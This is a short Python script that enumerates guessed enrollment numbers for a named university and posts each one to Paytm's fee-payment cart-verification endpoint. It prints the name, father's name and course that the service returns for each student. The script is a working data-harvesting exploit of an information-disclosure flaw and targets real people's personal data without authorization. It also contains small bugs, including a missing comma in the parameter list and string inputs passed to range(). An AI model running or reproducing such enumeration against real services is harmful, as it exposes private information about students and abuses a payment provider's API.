#!/usr/bin/python

import requests
import json

params = [
    "channel=web",
    "version=2",
    "child_site_id=1"
    "site_id=1",
    "locale=en-in",
    "utm_source=/papi/v1/expresscart/verify"
]
URL = "https://paytm.com/papi/v1/expresscart/verify?" + '&'.join(params)

headers = {
    'Content-Type': 'application/json'
}

jsonpayload = {
   "cart_items":[
      {
         "product_id":199236759,
         "qty":1,
         "configuration":{
            "price":10,
            "fee_type":"",
            "recharge_number":"dc2015bte0001"
         },
         "meta_data":{
            "state":"Assam",
            "city":"Guwahati",
            "school":"Don Bosco University",
            "area":"Azara",
            "paytype":"Fee Payment",
            "course":"N/A",
            "fee_type":"N/A",
            "brand":"Don Bosco University",
            "location":"Guwahati",
           
         }
      }
   ]
}

def changeroll(roll):
    jsonpayload['cart_items'][0]['configuration']['recharge_number'] = roll
    jsonpayload['cart_items'][0]['meta_data']['Enrollment Number'] = roll
start = input("Enter start range (xx format) : ")
end = input("Enter end limit (xx format) : ")
for i in range(start,end):
    roll = 'dc2017bte00' + str(i)
    changeroll(roll)
    postdata = json.dumps(jsonpayload)
    r = requests.post(URL, data=postdata, headers=headers)
    try:
        name = json.loads(r.text)['cart']['cart_items'][0]['service_options']['actions'][0]['customerName']
        course = json.loads(r.text)['cart']['cart_items'][0]['service_options']['actions'][0]['course']
        daddy = json.loads(r.text)['cart']['cart_items'][0]['service_options']['actions'][0]['fatherName']
        print("\n*************\n")
        print("Name: %s\nFather: %s\nCourse: %s" % (name, daddy, course))
        #print(json.dumps(s_data, indent=4, sort_keys=True))
    except Exception:
        continue